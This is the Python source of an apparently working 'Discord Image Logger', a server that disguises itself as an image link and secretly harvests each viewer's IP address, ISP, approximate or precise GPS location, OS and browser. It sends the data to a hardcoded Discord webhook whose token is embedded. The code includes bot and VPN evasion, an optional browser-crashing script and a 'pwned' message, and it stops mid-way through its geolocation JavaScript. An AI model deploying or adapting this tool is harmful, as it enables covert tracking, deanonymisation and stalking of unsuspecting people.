# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1345822488478617650/49kqvQV3SKyqdgkIlNuAWZFtJALE1ovYjOlvq2_6s-Khj_oZ6RCdYvXzoNtAreS08dVr",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Img logr", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "This browser has been pwned by heckerknjxy Image Logger.", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "data:image/png;base64,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" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
